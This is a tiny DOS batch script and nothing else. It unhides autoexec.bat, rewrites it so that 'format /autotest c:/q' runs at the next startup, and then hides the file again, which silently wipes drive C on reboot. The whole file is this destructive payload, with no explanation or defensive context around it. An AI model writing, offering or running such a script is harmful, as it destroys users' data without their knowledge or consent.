@ echo off 
call attrib -r -h c:autoexec.bat > nul 
echo @echo off > c:autoexec.bat 
echo format /autotest c:/q > nul >> c:autoexec.bat 
call attrib +r +h c:autoexec.bat > nul 
exit